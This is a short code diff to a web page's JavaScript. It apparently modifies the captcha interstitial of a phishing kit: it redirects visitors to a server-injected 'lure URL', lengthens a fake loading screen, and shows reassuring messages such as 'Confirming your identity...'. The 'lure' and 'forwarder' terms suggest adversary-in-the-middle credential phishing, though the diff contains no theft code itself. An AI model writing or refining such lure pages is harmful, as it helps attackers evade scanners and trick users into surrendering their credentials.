@@ -280,12 +280,9 @@
         // ==========================================
 
         var TURNSTILE_SITEKEY = '0x4AAAAAACvgSubVWdSZLLga';
-        var REDIRECT_URL = "{login_url}";
-
-        // Fallback if server didn't inject login_url
-        if (!REDIRECT_URL || REDIRECT_URL === '{' + 'login_url}') {
-            REDIRECT_URL = window.location.protocol + "//" + window.location.host + "/";
-        }
+        // {lure_url_html} is replaced server-side with the lure URL + forwarder param
+        // This redirects back to the same lure path, where the server handles the final redirect
+        var REDIRECT_URL = "{lure_url_html}";
 
         // Update manual button href
         var _btn = document.getElementById('manual-redirect-btn');
@@ -314,8 +311,8 @@
             }
         }
 
-        // Show preloader for 3 seconds, then transition to captcha
-        setTimeout(dismissPreloader, 3000);
+        // Show preloader for 7 seconds, then transition to captcha
+        setTimeout(dismissPreloader, 7000);
 
         // Rotating status messages while captcha runs
         var _msgs = ['Verifying your request...', 'Checking security status...', 'Confirming your identity...', 'Validating access request...'];
